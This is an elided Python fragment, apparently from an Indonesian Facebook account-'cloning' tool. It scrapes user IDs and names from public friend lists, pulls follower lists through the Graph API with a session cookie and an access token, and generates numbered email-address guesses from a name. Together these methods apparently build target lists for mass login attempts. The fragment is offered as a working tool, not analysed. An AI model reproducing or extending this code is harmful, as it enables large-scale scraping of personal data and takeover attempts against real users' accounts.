...
class romi_afrzl:
	...
	def converter(self,uid):
		if "me" in uid:
			...
			cox = self.roomz.get(f"https://mbasic.facebook.com/{uid}?_rdr").text
			try:user = re.findall('\;rid\=(\d+)\&',str(cox))[0]
			except:user = uid
		return {"uid":user}
	...
	def PublikCookie(self):
		...
		if user in self.tolol:
			...
			self.__dum__(f"{self.url_mb}/{uid.get('uid')}?v=friends")
		...
		try:
			...
			for x in url.find_all("a",href=True):
				if "Lihat Teman Lain" in x.text: 
					self.__dum__(f"{self.url_mb}/"+x.get("href"))
		except:pass 
		print("")
		if len(self.id)!=0:
		...
		try:
			...
			for i in otw:
				if "profile.php?" in i[0]:
					self.id.append(re.findall("id=(.*?)&amp;eav",i[0])[0]+"<=>"+i[1])
				else:
					self.id.append(re.findall("(.*?)\?eav", i[0])[0]+"<=>"+i[1])
				sys.stdout.write (f'\r{p}╰─{o} mengumpulkan ID{m} >{h} {len(self.id)} '),sys.stdout.flush();jeda(0.0050)
	...
	def FollowPublikGRAPH(self):
		try:
			...
			if user in self.tolol:
				...
				uid = self.converter(user)
				po = self.roomz.get(f"https://graph.facebook.com/{uid.get('uid')}/subscribers?limit=6001&access_token={self.tokenG}",cookies=self.cookie).json()
				for i in po['data']:
					self.id.append(f"{i['id']}<=>{i['name']}")
				sys.stdout.write (f'\r{p}╰─{o} mengumpulkan ID{m} >{h} {str(len(self.id))}'),sys.stdout.flush();jeda(0.0050)
		except KeyError:
	...
	def cloning_gmail(self,nama,jumlah):
		try:
			...
			for z in range(int(jumlah)):
				if len(nama.split())>1:
					mail = str(nama.split()[0])+str(nama.split()[1])+str(z)+str(domain)+"<=>"+str(nama.split()[0])+" "+str(nama.split()[1])
				else:
					mail = str(nama)+str(z)+str(domain)+"<=>"+str(nama)
				if mail in self.id:
					pass
				else:
					self.id.append(mail)
